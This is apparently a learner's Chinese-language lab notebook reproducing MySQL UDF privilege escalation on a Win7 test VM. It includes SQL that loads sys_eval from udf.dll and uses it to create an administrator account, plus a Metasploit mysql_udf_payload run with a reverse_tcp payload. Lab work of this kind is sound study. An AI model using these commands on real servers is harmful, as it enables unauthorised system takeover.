## UDF提权复现

### 环境搭建

靶机：虚拟机Win7+phpstudy2018

​			mysql5.5.53

​			php5.2.17

攻击机：物理机

在已经得到webshell的情况下，利用mysqlUDF提权，在靶机WIn7上创建administrator权限的用户



### UDF提权原理

条件：得到服务器webshell，知道数据库账号密码且可以远程连接

在udf.dll文件中，定义了名为sys_eval()的函数，该函数可以执行系统命令，通过该函数来完成系统用户的创建和提权。

注意事项：

1. 引用sys_eval()函数

   ```sql
   create function sys_eval returns string soname 'udf.dll';
   ```

2. 当MySQL<5.1版本时，将.dll文件导入到C:\WIndows\system32目录下

   当MySQL>5.1版本时，将.dll文件导入到安装目录下lib\plugin目录下

3. 保证secure_file_priv的值为空，才可以进行文件的导入和导出（确保登录用户有操作文件的权限）

   ```sql
   show global variables like '%secure%';
   ```

4. 在复现过程中，我首先用了phpstudy集成环境中的MySQL，但数据库始终无法与物理机实现远程连接。且在利用暗月shell的时候无法创建plugn路径并写入udf.dll。

   于是我又在官网下载了MySQL5.52版本（64位和32位），能够进行远程连接，顺利地写入udf.dll。具体原因暂时还未找到，现在这里记下问题。

### 提权过程

1. 查看数据库版本：5.5.53

![](https://s2.loli.net/2022/03/29/tkbg3RceOBqHQ6u.png)

2. 查看权限

```sql
show variables like '%secure%';
```

返回结果为C:\

说明数据库用户对C盘有文件控制权限



3. 查看MySQL安装路径

   ```sql
   select @@basedir;
   ```

   ![](https://s2.loli.net/2022/03/29/fhOu5ElnWCGI9KD.png)

4. 查看服务器是64位还是32位

![](https://s2.loli.net/2022/03/29/iLt5u3fKc487gPe.png)

由上图可知是32位mysql



5. 利用暗月UDF提权：导出udf.dll文件

   ![](https://s2.loli.net/2022/03/30/6LvQ1pmayVBl3qN.png)

   登录后可以查看MySQL信息，与我们之前收集的信息一致
   
   ![image-20220330093221135](C:\Users\19026\Desktop\UDF提权复现.assets\image-20220330093221135.png)

   点击导出udf：
   
   
   
   ![](https://s2.loli.net/2022/03/30/1XWBYT4pPnqoV57.png)
   
   进入服务器查看导出的udf文件
   
   ![](https://s2.loli.net/2022/03/30/yMfK98cnxvYuXAZ.png)
   
   

6. 利用暗月自带的命令创建sys_eval函数并添加管理员权限

   ![](https://s2.loli.net/2022/03/30/7ym5sWwlDJGqYhT.png)

   添加用户：

   ```bat
   select sys_eval('net user test test /add')
   ```

   添加用户到管理员组：

   ```bat
   select sys_eval('net localgroup administrators test /add')
   ```

   ![](https://s2.loli.net/2022/03/30/o9dCqa1pm3LbAK8.png)

   进入服务器查看，已经添加成功！

7. 除此之外，还可以利用msf上传udf.dll文件：

   ```shell
   msf6 exploit(multi/mysql/mysql_udf_payload) > show options 
   
   Module options (exploit/multi/mysql/mysql_udf_payload):
   
      Name              Current Setting  Required  Description
      ----              ---------------  --------  -----------
      FORCE_UDF_UPLOAD  false            no        Always attempt to install a sys_exec() mysql.function.
      PASSWORD          root             no        The password for the specified username
      RHOSTS            10.10.10.137     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
      RPORT             3306             yes       The target port (TCP)
      SRVHOST           0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
      SRVPORT           8080             yes       The local port to listen on.
      SSL               false            no        Negotiate SSL for incoming connections
      SSLCert                            no        Path to a custom SSL certificate (default is randomly generated)
      URIPATH                            no        The URI to use for this exploit (default is random)
      USERNAME          root             no        The username to authenticate as
   
   
   Payload options (linux/x86/meterpreter/reverse_tcp):
   
      Name   Current Setting  Required  Description
      ----   ---------------  --------  -----------
      LHOST  10.10.10.139     yes       The listen address (an interface may be specified)
      LPORT  4444             yes       The listen port
   
   
   Exploit target:
   
      Id  Name
      --  ----
      0   Windows
   
   
   msf6 exploit(multi/mysql/mysql_udf_payload) > run
   
   [*] Started reverse TCP handler on 10.10.10.139:4444 
   [*] 10.10.10.137:3306 - Checking target architecture...
   [*] 10.10.10.137:3306 - Checking for sys_exec()...
   [*] 10.10.10.137:3306 - Checking target architecture...
   [*] 10.10.10.137:3306 - Checking for MySQL plugin directory...
   [*] 10.10.10.137:3306 - Target arch (win32) and target path both okay.
   [*] 10.10.10.137:3306 - Uploading lib_mysqludf_sys_32.dll library to C:/Program Files (x86)/MySQL/MySQL Server 5.5/lib/plugin/dEuXsmQu.dll...
   [*] 10.10.10.137:3306 - Checking for sys_exec()...
   [*] 10.10.10.137:3306 - Command Stager progress -  55.47% done (1444/2603 bytes)
   [*] 10.10.10.137:3306 - Command Stager progress - 100.00% done (2603/2603 bytes)
   [*] Exploit completed, but no session was created.
   msf6 exploit(multi/mysql/mysql_udf_payload) > Interrupt: use the 'exit' command to quit
   msf6 exploit(multi/mysql/mysql_udf_payload) > 
   ```

   

   写入的文件名为```dEuXsmQu.dll```

   前往服务器查看：

   ![](https://s2.loli.net/2022/03/30/I2B86izUQjGbfhe.png)

   上传成功！！

   创建函数

   ```
   create function sys_eval returns string soname 'dEuXsmQu.dll';
   ```

   执行命令

   ```shell
   select sys_eval('net user');
   ```

   ![](https://s2.loli.net/2022/03/30/RCtOL1r9eksdhnu.png)

